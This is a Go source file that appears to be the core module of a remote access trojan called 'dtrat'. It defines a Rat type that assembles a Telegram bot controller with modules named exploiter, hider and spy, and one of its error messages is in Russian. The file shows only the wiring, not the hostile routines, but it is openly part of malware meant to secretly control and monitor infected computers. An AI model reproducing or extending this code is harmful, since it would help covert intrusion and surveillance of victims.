package rat

import (
	"dtrat/bot"
	"dtrat/config"
	"dtrat/engine"
	"dtrat/exploiter"
	"dtrat/hider"
	"dtrat/spy"
	"fmt"
	"io"
)

type Rat struct {
	Bot       bot.Bot
	Engine    *engine.Engine
	Exploiter *exploiter.Exploiter
	Hider     *hider.Hider
	Spy       *spy.Spy

	Config  config.Config
	CloseCh chan (error)
}

func NewRat() (*Rat, error) {
	cfg, err := config.NewConfig()
	if err != nil {
		return nil, fmt.Errorf("NewConfig: %w", err)
	}

	bot, err := bot.NewTgBot(cfg)
	if err == io.EOF {
		return nil, fmt.Errorf("Отсутсвует соединение")
	}

	if err != nil {
		return nil, fmt.Errorf("NewBot: %w", err)
	}

	eng, err := engine.NewEngine(cfg)
	if err != nil {
		return nil, fmt.Errorf("NewEngine: %w", err)
	}

	exp, err := exploiter.NewExploiter()
	if err != nil {
		return nil, fmt.Errorf("NewExploiter: %w", err)
	}

	hdr, err := hider.NewHider()
	if err != nil {
		return nil, fmt.Errorf("NewHider: %w", err)
	}

	spy, err := spy.NewSpy()
	if err != nil {
		return nil, fmt.Errorf("NewSpy: %w", err)
	}

	rat := Rat{
		Bot:       bot,
		Engine:    eng,
		Exploiter: exp,
		Hider:     hdr,
		Spy:       spy,
		Config:    cfg,
		CloseCh:   make(chan error, 1),
	}

	return &rat, nil
}
